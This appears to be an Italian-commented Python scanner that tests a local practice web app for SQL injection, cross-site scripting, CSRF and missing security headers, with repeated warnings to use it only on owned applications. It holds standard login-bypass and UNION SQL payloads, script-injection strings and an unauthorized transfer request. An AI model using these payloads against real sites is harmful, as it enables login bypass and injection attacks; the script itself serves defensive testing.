#!/usr/bin/env python3
"""
Script per testare vulnerabilità web
Utilizzare SOLO su applicazioni di cui hai il permesso!
"""

import requests
from urllib.parse import urljoin
import sys
from colorama import init, Fore, Style

init(autoreset=True)

class SecurityTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.vulnerabilities_found = []
        self.session = requests.Session()
    
    def print_header(self, text):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{text}")
        print(f"{'='*60}{Style.RESET_ALL}")
    
    def print_success(self, text):
        print(f"{Fore.GREEN}[✓] {text}{Style.RESET_ALL}")
    
    def print_warning(self, text):
        print(f"{Fore.YELLOW}[!] {text}{Style.RESET_ALL}")
    
    def print_error(self, text):
        print(f"{Fore.RED}[✗] {text}{Style.RESET_ALL}")
    
    def test_sql_injection(self):
        self.print_header("TEST SQL INJECTION")
        
        payloads = [
            ("admin' OR '1'='1", "Bypass autenticazione con OR '1'='1'"),
            ("admin'--", "Bypass con commento SQL"),
            ("' UNION SELECT 1,2,3,4--", "UNION-based injection"),
        ]
        
        endpoint = "/login-vulnerable"
        url = urljoin(self.base_url, endpoint)
        
        print(f"Testando endpoint: {url}\n")
        
        for payload, description in payloads:
            print(f"Payload: {payload}")
            print(f"Descrizione: {description}")
            
            try:
                data = {
                    'username': payload,
                    'password': 'qualsiasi'
                }
                response = self.session.post(url, data=data)
                
                # Verifica se il login è riuscito
                if "Login riuscito" in response.text or "Benvenuto" in response.text:
                    self.print_error("SQL INJECTION VULNERABILITÀ CONFERMATA!")
                    self.vulnerabilities_found.append(f"SQL Injection su {endpoint}")
                elif "Errore SQL" in response.text:
                    self.print_warning("Errore SQL rilevato - possibile vulnerabilità")
                else:
                    self.print_success("Payload bloccato correttamente")
                    
            except Exception as e:
                self.print_warning(f"Errore nel test: {str(e)}")
            
            print()
    
    def test_xss(self):
        self.print_header("TEST CROSS-SITE SCRIPTING (XSS)")
        
        payloads = [
            ("<script>alert('XSS')</script>", "Script tag basico"),
            ("<img src=x onerror='alert(1)'>", "Event handler su img"),
            ("<svg onload=alert('XSS')>", "SVG con onload"),
            ("javascript:alert('XSS')", "JavaScript protocol"),
        ]
        
        endpoint = "/comment-vulnerable"
        url = urljoin(self.base_url, endpoint)
        
        print(f"Testando endpoint: {url}\n")
        
        for payload, description in payloads:
            print(f"Payload: {payload}")
            print(f"Descrizione: {description}")
            
            try:
                data = {'comment': payload}
                response = self.session.post(url, data=data)
                
                # Verifica se il payload è presente senza escape
                if payload in response.text:
                    self.print_error("XSS VULNERABILITÀ CONFERMATA!")
                    self.vulnerabilities_found.append(f"XSS su {endpoint}")
                else:
                    self.print_success("Payload sanitizzato correttamente")
                    
            except Exception as e:
                self.print_warning(f"Errore nel test: {str(e)}")
            
            print()
    
    def test_csrf(self):
        self.print_header("TEST CROSS-SITE REQUEST FORGERY (CSRF)")
        
        endpoint = "/transfer-vulnerable"
        url = urljoin(self.base_url, endpoint)
        
        print(f"Testando endpoint: {url}\n")
        
        try:
            # Test senza token CSRF
            data = {
                'recipient': 'attacker',
                'amount': '1000'
            }
            response = self.session.post(url, data=data)
            
            if "Trasferimento Eseguito" in response.text:
                self.print_error("CSRF VULNERABILITÀ CONFERMATA!")
                self.print_warning("Il form accetta richieste senza token CSRF")
                self.vulnerabilities_found.append(f"CSRF su {endpoint}")
            else:
                self.print_success("Richiesta bloccata - protezione CSRF attiva")
                
        except Exception as e:
            self.print_warning(f"Errore nel test: {str(e)}")
    
    def test_security_headers(self):
        self.print_header("TEST SECURITY HEADERS")
        
        required_headers = {
            'X-Frame-Options': 'Previene clickjacking',
            'X-Content-Type-Options': 'Previene MIME sniffing',
            'Content-Security-Policy': 'Previene XSS e injection',
            'Strict-Transport-Security': 'Forza HTTPS',
            'X-XSS-Protection': 'Protezione XSS del browser'
        }
        
        try:
            response = self.session.get(self.base_url)
            
            print("Controllo header di sicurezza:\n")
            
            for header, description in required_headers.items():
                if header in response.headers:
                    self.print_success(f"{header}: {response.headers[header]}")
                    print(f"   {description}")
                else:
                    self.print_error(f"{header}: MANCANTE")
                    print(f"   {description}")
                    self.vulnerabilities_found.append(f"Header mancante: {header}")
                print()
                
        except Exception as e:
            self.print_warning(f"Errore nel test: {str(e)}")
    
    def generate_report(self):
        self.print_header("REPORT FINALE DELLA SCANSIONE")
        
        if self.vulnerabilities_found:
            print(f"\n{Fore.RED}⚠️  VULNERABILITÀ TROVATE: {len(self.vulnerabilities_found)}{Style.RESET_ALL}\n")
            for i, vuln in enumerate(self.vulnerabilities_found, 1):
                print(f"{i}. {vuln}")
            print(f"\n{Fore.YELLOW}ATTENZIONE: Correggi queste vulnerabilità prima del deploy!{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}✓ Nessuna vulnerabilità trovata nei test eseguiti{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}Nota: Questo è un test base. Per una scansione completa,")
        print(f"usa strumenti professionali come OWASP ZAP o Burp Suite.{Style.RESET_ALL}\n")

def main():
    print(f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════╗
║           SECURITY VULNERABILITY SCANNER                   ║
║                                                            ║
║  ATTENZIONE: Usa solo su applicazioni di tua proprietà!   ║
╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """)
    
    # URL di default - modifica se necessario
    target_url = input("Inserisci URL target (default: http://127.0.0.1:5000): ").strip()
    if not target_url:
        target_url = "http://127.0.0.1:5000"
    
    print(f"\nTarget: {target_url}")
    input("Premi INVIO per iniziare la scansione...")
    
    tester = SecurityTester(target_url)
    
    # Esegui tutti i test
    tester.test_sql_injection()
    tester.test_xss()
    tester.test_csrf()
    tester.test_security_headers()
    
    # Genera report finale
    tester.generate_report()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Scansione interrotta dall'utente{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}Errore: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
